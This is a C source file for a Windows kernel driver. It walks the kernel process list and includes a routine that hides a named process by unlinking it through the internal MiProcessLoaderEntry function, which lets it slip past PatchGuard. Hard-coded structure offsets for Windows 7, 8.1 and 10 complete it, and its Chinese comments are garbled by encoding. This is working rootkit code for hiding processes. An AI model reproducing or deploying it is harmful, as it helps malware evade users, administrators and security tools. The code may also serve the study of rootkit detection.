#include "EnumProcess.h"
#include "GetMiProcessLoaderEntry.h"


// ��������
BOOLEAN EnumProcess()
{
	PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
	ULONG ulOffset = 0;
	HANDLE hProcessId = NULL;
	PUCHAR pszProcessName = NULL;
	
	// ���ݲ�ͬϵͳ, ��ȡ��Ӧƫ�ƴ�С
	ulOffset = GetActiveProcessLinksOffset();
	if (0 == ulOffset)
	{
		DbgPrint("GetActiveProcessLinksOffset Error!\n");
		return FALSE;
	}

	// ��ȡ��ǰ���̽ṹ����
	pFirstEProcess = PsGetCurrentProcess();
	pEProcess = pFirstEProcess;

	// ��ʼ����ö�ٽ���
	do
	{
		// �� EPROCESS ��ȡ���� PID
		hProcessId = PsGetProcessId(pEProcess);
		// �� EPROCESS ��ȡ��������
		pszProcessName = PsGetProcessImageFileName(pEProcess);
		// ��ʾ
		DbgPrint("[%d]%s\n", hProcessId, pszProcessName);

		// ����ƫ�Ƽ�����һ�����̵� EPROCESS
		pEProcess = (PEPROCESS)((PUCHAR)(((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset))->Flink) - ulOffset);

	} while (pFirstEProcess != pEProcess);

	return TRUE;
}


// ����ָ������(Bypass Patch Guard)
BOOLEAN HideProcess_Bypass_PatchGuard(PUCHAR pszHideProcessName)
{
	PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
	ULONG ulOffset = 0;
	HANDLE hProcessId = NULL;
	PUCHAR pszProcessName = NULL;
	typedef_MiProcessLoaderEntry pMiProcessLoaderEntry = NULL;

	// ��ȡ MiProcessLoaderEntry ������ַ
	pMiProcessLoaderEntry = (typedef_MiProcessLoaderEntry)GetFuncAddr_MiProcessLoaderEntry();
	if (NULL == pMiProcessLoaderEntry)
	{
		return FALSE;
	}
	DbgPrint("pMiProcessLoaderEntry[0x%p]\n", pMiProcessLoaderEntry);

	// ���ݲ�ͬϵͳ, ��ȡ��Ӧƫ�ƴ�С
	ulOffset = GetActiveProcessLinksOffset();
	if (0 == ulOffset)
	{
		DbgPrint("GetActiveProcessLinksOffset Error!\n");
		return FALSE;
	}

	// ��ȡ��ǰ���̽ṹ����
	pFirstEProcess = PsGetCurrentProcess();
	pEProcess = pFirstEProcess;

	// ��ʼ����ö�ٽ���
	do
	{
		// �� EPROCESS ��ȡ���� PID
		hProcessId = PsGetProcessId(pEProcess);
		// �� EPROCESS ��ȡ��������
		pszProcessName = PsGetProcessImageFileName(pEProcess);

		// ����ָ������
		if (0 == _stricmp(pszProcessName, pszHideProcessName))
		{
			// ժ��(Bypass Patch Guard)
			pMiProcessLoaderEntry((PVOID)((PUCHAR)pEProcess + ulOffset), FALSE);   
			// ��ʾ
			DbgPrint("[Hide Process][%d][%s]\n", hProcessId, pszProcessName);
			break;
		}

		// ����ƫ�Ƽ�����һ�����̵� EPROCESS
		pEProcess = (PEPROCESS)((PUCHAR)(((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset))->Flink) - ulOffset);

	} while (pFirstEProcess != pEProcess);

	return TRUE;
}



// ���ݲ�ͬϵͳ, ��ȡ��Ӧƫ�ƴ�С
ULONG GetActiveProcessLinksOffset()
{
	ULONG ulOffset = 0;
	RTL_OSVERSIONINFOW osInfo = {0};
	NTSTATUS status = STATUS_SUCCESS;
	// ��ȡϵͳ�汾��Ϣ
	status = RtlGetVersion(&osInfo);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("RtlGetVersion Error[0x%X]\n", status);
		return ulOffset;
	}
	// �ж�ϵͳ�汾
	switch (osInfo.dwMajorVersion)
	{
	case 6:
	{
		switch (osInfo.dwMinorVersion)
		{
		case 1:
		{
			// Win7
#ifdef _WIN64
			// 64 Bits
			ulOffset = 0x188;
#else
			// 32 Bits
			ulOffset = 0x0B8;
#endif
			break;
		}
		case 2:
		{
			// Win8
#ifdef _WIN64
			// 64 Bits
#else
			// 32 Bits
#endif
			break;
		}
		case 3:
		{
			// Win8.1
#ifdef _WIN64
			// 64 Bits
			ulOffset = 0x2E8;
#else
			// 32 Bits
			ulOffset = 0x0B8;
#endif
			break;
		}
		default:
			break;
		}
		break;
	}
	case 10:
	{
		// Win10
#ifdef _WIN64
		// 64 Bits
		ulOffset = 0x2F0;
#else
		// 32 Bits
		ulOffset = 0x0B8;
#endif
		break;
	}
	default:
		break;
	}

	return ulOffset;
}